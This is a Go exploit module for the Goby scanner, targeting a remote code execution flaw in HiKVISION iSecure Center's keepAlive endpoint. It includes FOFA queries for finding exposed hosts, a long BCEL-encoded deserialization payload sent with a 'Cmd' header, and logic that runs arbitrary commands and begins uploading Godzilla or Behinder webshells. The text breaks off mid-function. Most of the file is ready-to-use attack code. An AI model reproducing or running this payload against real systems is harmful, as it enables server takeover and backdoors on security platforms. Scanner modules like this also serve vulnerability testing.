package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HiKVISION iSecure Center keepAlive remote code execution vulnerability",
    "Description": "<p>HiKVISION iSecure Center provides capabilities in video, all-in-one card, parking lot, face application, event service, alarm detection, temperature measurement application, etc.</p><p>HiKVISION iSecure Center keepAlive routing has an arbitrary code execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Product": "HIKVISION-Security-Platform",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2023-08-14",
    "PostTime": "2023-09-11",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\"",
    "GobyQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\"",
    "Level": "3",
    "Impact": "<p>HiKVISION iSecure Center keepAlive routing has an arbitrary code execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,webshell",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "abc.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\"); %>",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution",
        "File Upload"
    ],
    "VulType": [
        "Code Execution",
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "HiKVISION iSecure Center keepAlive 远程代码执行漏洞",
            "Product": "HIKVISION-安防平台",
            "Description": "<p>HiKVISION iSecure Center 提供了视频、一卡通、停车场、人脸应用、事件服务、报警检测、测温应用等方面的能力开放。</p><p>HiKVISION iSecure Center&nbsp; keepAlive 路由存在任意代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "代码执行",
                "文件上传"
            ],
            "Tags": [
                "代码执行",
                "文件上传"
            ]
        },
        "EN": {
            "Name": "HiKVISION iSecure Center keepAlive remote code execution vulnerability",
            "Product": "HIKVISION-Security-Platform",
            "Description": "<p>HiKVISION iSecure Center provides capabilities in video, all-in-one card, parking lot, face application, event service, alarm detection, temperature measurement application, etc.</p><p>HiKVISION iSecure Center keepAlive routing has an arbitrary code execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p>",
            "Impact": "<p>HiKVISION iSecure Center keepAlive routing has an arbitrary code execution vulnerability. An attacker can use this vulnerability to execute arbitrary code on the server side, write a backdoor, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution",
                "File Upload"
            ],
            "Tags": [
                "Code Execution",
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10887"
}`

	sendPayload606bcf97 := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/bic/ssoService/v1/keepAlive")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "application/json")
		cfg.Header.Store("Cmd", cmd)
		cfg.Data = "{\"CTGT\": { \"xxx\": {\"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassLoader\": {\"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"}, \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dY$J$60T$f5$d1$9f$d9$ec$ee$7b$bby9X$S$60$81$e0$o$I$n$t$oF$5c$94B$Ch$q$E$q$U$M$u$ba$d9$bc$q$L$9b$7d$cb$k$i$a2$e2$81$H$de$b7$82$f7Q$d3$d6$k$d1$ea$82R$QO$bc$eaQ$7bh$ebQ$ab$d5$b6_$eb$d7$7e$f6$eb$a1H$fa$9b$f7v$97lX$d0d$f3$3fg$e6$3f$ff$99$df$cc$7f$W$5e$3e$f0$e4$k$o$9a$c6$9f$ba$a9$82$fe$e5$a6$b9$f4oi$fe$p$d3$_TJ$b9i$M$7d$e9$a6$fd$f4$954$H$U$da$n$db$D$w$bd$e9$s$l$93$ca$ac$b2M$e1$C$95$ed$w$3b$Uv$82$81$V$95U$95$kV$d8UH$p$d8$zM$a1J$f7$ab$ac$v$5c$q$E$c5$K$97$b8$b9$94$87$a9$ecQx$b8J$P$ba$e9z$$$T$91$e5$w$8fp$d1$q$k$a9$f0$u7z$af$ca$a3es$8c$f0$8dU$b9B$a1$87d8N$e5$a3$U$f6$a9$3c$5e$e5$a3ea$82$c2$T$a1$h$l$e3$e6I$3cF$e5$c9$o$adR$e5$v$d2W$a9$5c$z$7d$8d4$b5$w$d7I_$af$f2T$XD$l$x$e7L$93$e68$99NW$f8x$R$d4$m$cd$J$w$bd$a7$f2$M$95O$U$r$fc$d2$ccT$f9$q7$9f$cc$b3D$c6$b7T$9e$ad$f2$i$95$h$Vnr$d3$S$b1$e1$S$9e$ab$f2$3c$e9$e7$ab$7c$8a$ca$a7$aa$dc$ac$f2in$5e$c0$z$d2$yT$b8$d5$cd$8bx$b1$9b$ce$e2$d3U$5e$o$7d$9b4K$a5$f9$b6$ec$z$93f$b9$9b$eaE$c6$ZrR$bb$ca$x$84$7b$a5$c2g$8a$aeg$b9i$N$af$92f$b1$d0$9e$z$p$b39$c7$cd$B$ee$90$s$e8$e6N$d6$a5$e9r$90$f53M$$$d5$z$M$3dB$hRy$b5$i$b2F$e5$b0$ca$bd$wG$dclp$d4$cdk9$a6p$dcM$X$cb$85$$$e6$84$caI$85$d7$b9$e92nWx$bd$9b$ae$e0$N$d2l$94$a6K$gH$3aW$b67$89$89$ceS$f8$7c$s$5b$u$ca$e4iY$jX$X$a8$P$H$o$dd$f5m$89X$u$d2$3d$93$c9$k5b$J$a6$e1$83$f6$9a$p$J$bd$5b$8fa$d3yR$u$SJ$ccb$w$a8$9c$b2$M$b4MF$a7$ceT$d2$S$8a$e8$ad$c9$de$O$3d$b64$d0$R$d6E$b2$R$M$84$97$Fb$n$99$a7$X$Z$7f$beAb$5b$8d$b6d$b0g$7eH$Pw$ce$db$Q$d4$a3$89$90$R$c1$Z$F$c1p$9ci$d8$m$c2$a6p$m$k$X$d5$d6$Fb$c73$95$P$da$g$cc$e8$8a$c6$8c$a0$k$8f$h$b1$dc$ab$z$eaX$ad$H$T$o9$a6$af$85$94$98$k$8f$ca1$bd$9d$b8$Q$s$c90$eek$5b$d9$I$NW$e3$af$99$c9$9d$e8$89$e9$81$ce$d6$40$_T$$0$3a$b0$ec$ce$K$87r$a5$96$f4d$o$U$aeo$J$c5E$b6$d3b$c9$3dy$a9$b9$86$5d$O$e1$dcDO$I$bc$f6$969$d3$b1$e2$e8$8e$ZI$a81$f2$Q$f2SdCx$ba$98$bc$83vczW$Y$f7$a87$N$86$7d$c5$3a$R$o$87$af$ccwfQ$5b$o$Q$5c$b30$Q5$cd$P$af$x$7c$81$c2$9b$RA$Ik$E9$S$C$b2$A$e2$U$97$cb$9a$R$d2$5ca$p$d0i$9a$9c$e9$98$caC$n2$r$8fg$8e$k$ba$d6j$q$e6$h$c9H$8ec$ed$R$d8$T$99$A$aa$eb$h$f4$602$B$e3N$fa$9a$D$b2$b0T$7b$8cx$a29$d2e$M$b9n$96$c0$9d$8c$8a$e2$W$89$da$V$K$eb$R$d3$7dJ$d0$A$7c$pp$b1$p$g$88$Fz$Vz$F$aa$88$C0q$3c$Lt$d3$97m$c1$40$qb$B$ddH$s$a2I$c1$85$B$g$r$ed$fc$dc$b0Xl$z$ca$d9$e9$fb4$f5v$w$7c$nR$I$S$8e$c2$X$811$a6$af$d3cq$a8qb$9e$8b$e6$J$b1$bcww$c5$7b$f4pxq$m$d1$D$95$a3$d9$d8$88$e8$89$fa6$p$b8F$X$fc$d9$a2$a1ld$84$M$c8$83$f6$Q$a0$Hz$cdMh$60$8b$87d$E$eb$8c$c8$92$z2oy$90$$n$m$b5$p$89$v$7c$b1$c2$97$e0$e4$f5$b1PB$9f$l$92$f0$9dq$e4$h$i$c9y$f6$$SBq$f6$5c$91$u$Bi$88$89G$e7$y$PQ$a9$b8S$P$o$c9t6e$bcX$QKF$60$f16$p$Z$L$a65S$e6L$af$T$R$g$ddB$b7j$bc$85$_$d5$f82$be$5c$e3$xx$ab$c6W$f2U$80$bd$c6W$f35$g_$cb$d7i$7c$3d$df$a0$f1$8d$7c$T$U$ebI$q$a2$S$bc$81X$b7$O$e1$9e$83$ca$_IF$oV$derJ$e0N$9c$8asz$C$91$ce$b0$8e$f42$ee$c8YL$e3$9by$x$Y$bb$c3FG$m$8cK$e4$a6$L$8do$e1$5bE$97$db$98$Kq$ee$S$q$q$84$9ed$d2$na$a4$f1$ed$bc$N$f9fh2Sx$bb$c6w$f0$9d$f0$Q$f8OE$c0$8bV$a5CM$af$d1$8b$f4$92$c6w$f1$dd$C$o$jV$N$q$92$Qz$P$dd$F$U$j$82$3e$d8$8f$efe$9ah$c4$ba$eb$C$d1$40$b0G$afK$Y$bd$c1$40$a2NT$af$ebHv$d55n$E$ca$7b$92$915$g$3dK$cfi$7c$l$df$8fh$83h$d9$80$e4$HD$5d$a5$d3X$$$b8A$b8$e4$c9$d4$e9$d5$baH$c80$c55$s$bb$baD$7b$fb$faX$m$aa$f1$83$f4$i$9e$89$afK$t$g$7f$87$lR$b8$8f$894$fe$$$7f$P$97$P$g$bd$bd$f0$8f$_b$q$7c$91d8$ac$f1$f7$f9$GD$fd$E$f9$d1$f8a$fe$81$c6$3f$e4$l$n$84$fc$g$ff$98$fb$91$b52$y$e9$u$f5I$8e$f1u$Z$b1$de$40$c2$a7$c7bFl$bcF7$d0$8d$g$3f$c2$8fj$fc$T$7eL$a3$9b$e8$e6$iC$5b$e9V$y$f7$b8$c6$v$ba$V$HN$94$l$e4n$B$bd$cf$caJC$85$fe$95$3e$d3$e8Mz$J$b62$e2uV$5e$dc$a1$f1N$f1$d6$T$a2u$c1$faPD$deb8$RaY$8b$f1$c8$a1$cemL$86$c2p$bb$c6O$f2$$$9c$ea$ab$8d$f8$a6k$fcS$e1$b6$d5$H$cd$95$84o$ba$Eu$8f$88$I$w$bc$5b$e3$3d$fc$U$O$e6$bd$Z$f7$PN$7bH$5d$g$3f$cd$cf$c8e$9e$F$cb$99$B$8d$9f$e3$e75$7e$81$f7i$fc$a2$E$cdK$d8$e5$97$e5$96J$7dG$uR$l$ef$R$e2W$q$cb$f6v$d6$n$L$8a$f0W38$3e$98$a04$fe$Z$Q$P$d2$d74$7e$9d$df$d0$f8M$de$87$i$a3$f1$cf$r$Q$de$e2$5b$91m4$fe$F$df$ab$f1$_$r$84$7f$c5$bf$d6$f8m$d9$7bG$O$ab$c88$u$9dg$z$3b$d6$f8z$e3$dd$be$daY$g$ffF$$$cd$e3$81$ac$a1$84$c6$g$acN$c8$bc$G$3e$p$e6K$3f$H$3e$dc$d9$84J$87n$a2E$e1$dfj$fc$$$7f$a0$f0$ef4$fe$90$7f$8f$y$ZOF$ea$7bC$f1$60$7d$e3$9c$b6y$N$d3$e7$9a$89$I$f6$feHv$877$G$e2z$c3t$9f$95$9e$y$85$98$b4$c1$99$8ci$d4$e1$S$9b$98$e2c$b9$f0$l$Q$98$c8$l$f2$8e$f8$7d$g$7f$C$p$d3$7b$f4$3e$ac$3f$H$ae$x$cf$5b$h$e4$60$n$a7$w$c8$J$ea$c5$d97$xG$8a$b1$de$caj$c3$f3$3c$VLe$f9$5e$G$d4$S$c1d$y$G$ab$zM$X9e$95S$f2$95$i$c5HF9$8az$f3$d0e$ea$h$V$c4$e92cxe$be$a2$a2$U$E0z8$Q$d3$3b$d3$d7$ab$fd$9arah$8dT$84$cc4$c7$b4n$c8$bc$b4$bdr$85$d4$ad$Ff$b2$cf$a9$3d$d2E$e2$94$7cu$a3$Cr$ab$W$cc$bd$f7$c1$e2D$40$V$II$f54f$b0$d0$a6$9e$40$acM_$9b$d4$pA$7d$e6$94$V$d0$H$92$da$92Q$3d$W$b4$$n$8f$87$ce$d5$cdj$gUgyes$de$e3$r$c5$_$d4$T$3d$G$M0$3b$8f$BV$kb$bb$7c$s$b1$q$cc$cc$802$cf$k$k$acPd$9d$b1fh$b5$92Vd$e57$b4$96$f8$d5$7c$N$c4$dcS$a4$ac$b6$_m_$3cOf$cdb$fc$c2$88$be$be9$SO$E$60$94$a1$W$cd$K$Z6$c8$f7$Z$ed$U$qQ$cb$N$e5$C$j$89$e3$N$W$82Z$M$eb$B$f4$k$8a$pkkfN$y$e5$f08$e1$9f$80$7c$e3$u$cf$H$87$VR$b7$c7B$I$B74$8e$r$e2$cbCR$85$95$e7$c3$e1$K$b3$de$8b$86$Dr$af$b9$87$c5$c1a$f1$91$PY$8ex4$i$CV$t$e7$3b0o$j$ac$a2$ca$8d$eb$cdR$w$e5$d5$S$40S$d6$F$c2I$7d$R$be_$8c$c8$85$dc$c1$_z$p$H$b3fJ$a1$99$e2$3e$87i$87$dcbcc$3c$a1$f7Z$b5$M$b2$O$e0$9d$d8$88Y$c2h1$d6$eb$b1$a6$80T6$ce$404$aaG$beA$I$e7$3cnr$9f$84a$z$e5$q7$a8$94$I$J$U$dcR$3fe$s$e59$feO$_CFee$kS$N$s$3dX$caK$K$cb$c9$88$p32$P$a9$aaGU$e6$dd$Q$pi$c9$b8$3eW$P$87zQ$F$c5$O$e3$bd$bc$df$3bPb$c6$5b$Bk3$t$I$f8$o$e6D$b4$9a$tOLF$x$a5S$8f$tb$c6$c6$c38y$d9$R$cf$ire5$UI$y$TD$I$k$Oe2$83$b6$E$K$e4$3e$J$a3$G$d9eH$cd$ae$86$e2Ma$p$ae$c3$db$$P$84$c2$d6$8bc$b7$de$O$c7z$ab6tt$85$93R$9a8$e2a$5d$8fJz8MNr$e9$hB$Zu$iA$Rc9y$n$94$Nt$eb$Z$e0$99v$b3$de$60k$3f$fd$3c$c34$d9$91$d6$yV5$a3$5d$b2$d1$d8$ca$c16$b7x$t$a6$89$b3y1$cf$k$c0k$bd$f2$f9$edc$a68$cd$a2$c8$d4$b2$c3$OB$c3$fc$aac$GN$e5$ca$c6$8c$v$e7t$c4$8d0$ea$T$f9NG$e3$e9z$aa$ml$90$N$bf$a87$89$d0$a3$d0D$af$60$j_j0$bf$8d$c8q$h$a94$M$9b$b7W$ed$m$U$8b$b6$U$V$b4T$a7$c8$eeq$a4$c8$b9$b0$c6$9e$o$a5$Gsu$_$b9$f0i$zh$b0$97$dbk$f7$dco$5b$5d$5bn$9f$e6wx$j$fb$c8$d9g$5b$e6$F$b9$db$ef$f4$3a$3d$85$v$d2$b6S$RFE$e6$I$bb3d$d7$ee$v$3e$uQ$WT$bf$e2U$9e$a6$S$93$a4$dc$ab$II$e9$m$S$rM$o$eb$c3d$bd$8fF$f8Us$9e$a2$e1$f8X$ab$87R$cbV$99$c5P$9af$b0$e6y$E$97$PY$dfK$p$f6$ca1$F$N$aer$97W$7d$82F2$dd$cf$86W$zw$3dA$a3l$e4w$7b$dd$c2$e7$j$c4$e7$Wy$85$deBY$l$5d$b0$9b$c6$a4h$ac$b7$Q$83$8a$U$8d$f3k$d6$c6Qvl$b4$Xx$7cm$e6$$f$V$98$8d$c7l$dc$5e$f2$f9$8b$bcEbH$g$a8$f2$c2lG$a7h$82$bf$d8$ab$J$e3D$8b$f1Q$3a$c6$e4$d4$y$ce$5d4$a9$7d$Y$bd$b8$83$s$8b$84$e5U$9e$ca$UM$f1$97xKRT$85$bb$95x$aa$9d$d6y5m$edv$e1mwX$Sj$bd$8a$d3$94$e0$z$c6$8e$88$v$Q$n$ed$O$Zz$8b$f7d$qZ$87$d7Y$87$7bK$G$9f$edUL$8a$3eZ$e4$_$a9$f2L$95$83K$bd$a5$9ec$ed$99$T$e5$94R$7b$e6$U1$82$92$x$ae4$af$b8$91$5b$5c$dcw$e0$aa$3eX$T$96$u$d8b$e7$be$afny$E$f8$bc$8d$ee$a7$ef$90$87$9e$a7$b7$e8W$e4$e1$dd$b6cm$d3$a9$9e$gh$a6$edj$f4$b3$a8$dd$ec$cf$a4$f3$cc$7e$b3$edB$e9m$97$d8$b6$9a$f3$C$ba$j$b8$ff$8cf$a2$f5$90$9d$86S$n$95Q9$7eG$d3$I$9aD$a3h$wy$nm$M$q$8d$a5y$88$9c3i$iu$d3Q$U$s$l$r$QM$9b$e9h$ba$92$s$d0u4$R$daL$82$3eS$a0$d1d$ea$a3J$daIU$b4$9b$aa$a1$5d$z$f4$9b$K$N$eb$e8m$9c$fa$R$jK$7f$a4i$f47$3a$8e$be$q$a4$U$3a$9e$8b$a9$81$x$e8$E$ae$a4$Z$7c$i$9d$c83$c8$cf$b3i$s$b7$d3I$bc$99N$e6$z4$8b$_$a7$d9$7c$p$cd$e1$dd$d4$c4$cf$d3$5c$7e$95$e6$d9Jh$be$edXZ$80$5b$9fbk$a0Sm$b3$a8$d9$b6$8aN$b3$5dH$z$b6K$a8$c1$b6$95N$c7M$5bm$d7$d2b$db$N$c0$e9m$d4F$dbp$db_$e0$8e$7d$88$ef$edt$H$ec$f86$eem$8e$m7Lw$d2$5dT$CI$8d$e6$a8$UrO$a3$bb$e9$k$w$e1J$5eI$f7$d2$7d$e4$e6$d9$dc$84$bb$deG$85$dc$ceU$f4$AF$gof$3b$3d$88$8cR$E$z$ff$O$x$3cD$c5$3c$8c7$e0$9c$ef$92$L$ba$ce$a5$efa$d7I$J$5b9$7d$l$i$K$X$f3$sz$98$7e$40$w$f4$x$80$G$f7$60$b7$c1$b6$92$7eH$3f$o$HM$b1E$e8$c7$e0$b5K$W$a2$7ez$Ez$X$da$ae$a1G$e9$t$c8T$e5$b8$dfc$f48$b2$d5$q$5b$8cR$b4$D$Sv$82$e2$D$f2$M$c0$J$O$85$9eP$e8I$85v$v$e4$82$89$f7S$99B$3f$ddO$a3$V$dam$dbOG$x$b4GW$e8$v$cfYh$b4$af$a8V$a1$bd$3c$40I$w$ce$e1$D$L$e8A$x$dbfg$7dv$T$N$40$ef$92oF$acP$Na$e1$e9$_i$c1$A$f4u$l$9eK$c4$3a$c89$94$80$a8$R$ec_$90$fd$L$ec$3e$83K$daa$80z$fc$3dK$cfY$e9$9a$d6$a0$_$40$3f$acz$tM$eb_h$s$ec$e9$c8$cf$c7$f7$83L$Y$i$40$9b$85$f7b$93p$VV$ce$86$bd$cf1$f1$e0$c3$9a$d3D$c1$f3$Q$E1i$7b$cb$e8$Fx$8dM$db$3a$89$e7$v$b4$_$ab$c2q$f8$7b$91$5eB$L$Vx$Vd$c8$ff$_$5c_$fd$Ci$9e$G$i$7e$c26rzf$f4ctbK$b5$c7$9f$a2$99$dbh$W$G$9e$86$U$9d$e499E$b3$W$d6$ecq$c0$eb$9eo$f5W$d5$UL$7b$9cfW$d5$d8$a7$ed$a49$3b$a9$f1qj$daEs$db$f1$fc$cck$adM$d1$7c$cf$v$fd$d5$9eSM$Z$d5$Y$i$w$a3$b9$l$oZ$c1$ef$b7W$d5z$91$82O$eb$af$c2$d1$L$fa$a1$93u$f3$r$88n1U$RP$5eJ$R$c4$80$81x$5e$L$f7$c4$Q$8fq$3a$k$A8$89$d6Q3$ad$H$ed$GZF$h$a9$9d6Q$H$9dOQ$ba$A$3b$9b$b1r$Rf$X$e3$f7$SD$fe$a5$a6$f5N$rqq$z$bdL$af$c0zK0$T$E$X$80g4$bdj$ae$9d$8f3$7f$G$3b$W$80O$a5$d70$b2$8b$a5$b2V$be$9e$5e$cfZy$E9$8b$A$d1$89$K$bd$f1$FM$d8OG$99$83R$ec$be$99$b1$b5$ed$j$f0$bb$60$f3$wO$cbNZ$98$a2$d6$85$a6$91$b9$95$fd$f6$g$cf$o$3c$b0$dbhv$b5g$b19$f0U$7bN7$9f$dc$91$bbhI$fb$Oj$D$edR$cf$b7$d1$a4hY$L$b2$be$cf$7cq$da$ed$9e$e5$c8$f7$d5m$7e$7b$l$9d$7cd$e63r$99$db$85yE$9ay$t$ad$U$eb$9f$d9$ba$8b$cej$87$e7V$ed$a0$b3$3d$e7$a4$u$mUA$8a$3a$b6Q$a1$f4$c1$3erx$g$fc$ce4U$e7A$aa$f4A$5e$t$O9$94$c3$3aYJ$K$bfR$fb$C$v$e0$d5$bdJ$bf$r$bc$cb$ef$cc$ae9$fb$fdjv$a2$3e$F$8b$ddD$H$d8$85$c0$91$be$C$d6s$b1$c7$ec$x$f8$u$e9$d3$u$e9B$ce$t$da$K$fb$5e$89X$b9$K$96$bf$g$_$c35x$B$aeE$G$bf$Oy$f1$G$a0$e2$s$e0$e8f$e0$e1V$8c$b6$nSn$87$c7$ef$40d$dc$89$dcz$X$7d$81$8cy$A$F$82$8d$k$c0$89$f7p$n$dd$cb$k$ccG$60$5e$81$7e$Cr$e66$T$91$w$f8V$d2$cf$f1BHh$9f$Cn$e4H$d0$7b$cc$7c$e8$Q$lgP$82$d1$83$sJ$5c$3c$9e$7e$89$91$8dJy4$de$95_C$f3$e1$3c$Sy$fc$V$dcR0$f4$E$V$j$90$a4$81$c4$f2$O$e03$e2$98$e1$fb$a9J$a1$df$cc$c1$d2$A$y$a0$98$vfw$96$A$5b$92$d5$90l$7e$3b$80$D$O$b3m$c36$fa$fd4$dc$UcKg$d9$83tf$9a$fb$8aJ$d1$k$81$e2$dd$B$d8$d65tC$K$d0w$e5$96$f2$8fRi$98$Hp$j$Nk$9fg$60nB$7b$3b$95$ee$C$ec$3c$dd$3b$a8$a7$b5$8f$8a$ccIH$s$80$k$bc$bd$da$8f$faeM$7buM$8a$c2$3b$a8$X$c8$A$iW$B1$e8$3aQr$A$t$R$d4$7f$98$Z$7e$97$cc$a2$a8$de$d0$ad$ddN$e7$I$e8bwS$a9$d7$z$a3x$8a$S$7d$D$9fI$F$98$5eT$O$$$aa$e9E$97$8c2$8b$a8$f9$92$5e$X$9a2Z$b7$936$c8$n$h$97K$e5R$d87p$b7$cct9$e9$dc$3e$f2$b5$a6a$ee$d9$EDC$eb$f3$q$ae$ce$b7$d0$dd$ef$b9$a0$l$c6$dbI$7b$e8ix$8b$60$9e$b7$b2$f5J$E$f5$I$e1$V$y$c5$3bX$81$Xp2$de$be$a9$a0$9d$F$af$b7$d1$93$U$a0$5d$U$c2$a3$b1$W$k$bb$80$9e$a2$cbh$_0$fa$M$d0$f9$y$5e$d3$e7$91$9b$5e$A$f7$3ep$bc$E$f9$_$e3$84W$b0$f3$wV_$c3$e8u$9c$rh$7c$DH$7c$T5$ca$5b$sN$b7$m$7f$8d$c6$f9$l$989l2$5erk4$V$f5$c0$ef$80$3f$3bN$bf$R$7c$l$C$b1$f3$Q3$bfG$95$e3$a4$W$f0$7d$8c$91$C$bd$ce$a7$3f$60$a4$d2$Kd$d1O$e8S$m$m$80$ec$fbG$8c$dc8i$ac$89vy$97$3e$cf$e6$c4$cf$cd$ef$tl$8e$e4$h$8a$cdDv$x$VV$ec$X$f4$A$5e$tRa$GE$7f$ca$A$e9$cf$K$fdO$e6$f3$X$7c$A$ab$b2$b2$b23$80H$fb$A$b0T$90e0$b1$3a$W$f2$ff$8a$K$d0z$c1$a2$e6$xH$b4$J$_$98R$83$ba$db$b3$b9$9f$B$aa$L$81$a4$8b$804$87$df$5e$bb$8f$cav$d1$c5p$dc$rX$dc$92$5dtz$$$ed$dfE$97$b5W$ef$a0$cb$F$7eW$b4$7b$ed$3bh$abd$r$f8$f6Jq$faU$d2$5c$9d$f1$fa5$92$dc$80$87k$d3$k$f7$dbe$d6$d5$P$V$8a$f00$8d$82$bb$c7$a1$80$ac5$cb$d9$Y$k$a7$fa$9cG$ec$7d$98$f2$D$3c$d8$l$82$fa$p$d0$7f$C$8e$8f$e1$a2O$c1$f5$t$f0$fd$F$9c$7f$G$cfgx$a4$ff$X$S$fe$8ff$c3$8c$L$e8$lt$3a$fd$3f$k$b6$7f$o$e9$fc$LR$ff$8d$t$ef$3f$d9Gl$b6I$fd7$b8s$B$K$d8$bf$83$cb$81$7d$a7$e9$iy$b06e$9d$b3$c9$7c$ce$d8$i$bdf$a6$a2$o$A$f3s$U$7dV$Zv$M$a9$aaM$Mn$l$U$e7V$Z$c4K$a4q$9e$87$W$C$fe$81$MjZ$l$_o$81$v$b0$b8$aa$ea1$U$C$8fQS$8a$ae$5b$fe$88$f9$NU$$$ee6$x$93$B$d4$97d$w$acY$d4i$95l$b8$96$b4$ff$e4$f7MZ$e6$b5l$f0$7b$e4$fa$_$a7$g$7b$ce$dc$o$A$A\"}}}"
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			rsp, err := sendPayload606bcf97(u, "echo "+checkStr)
			if err != nil {
				return false
			}
			return rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(ss.Params["cmd"])
				rsp, err := sendPayload606bcf97(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				} else {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html[:strings.Index(rsp.Utf8Html, "{\"code\":")]
				}
			} else if attackType == "webshell" {
				webshell := goutils.B2S(ss.Params["webshell"])
				var content string
				filename := goutils.RandomHexString(16) + ".jsp"
				if webshell == "behinder" {
					// 该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond
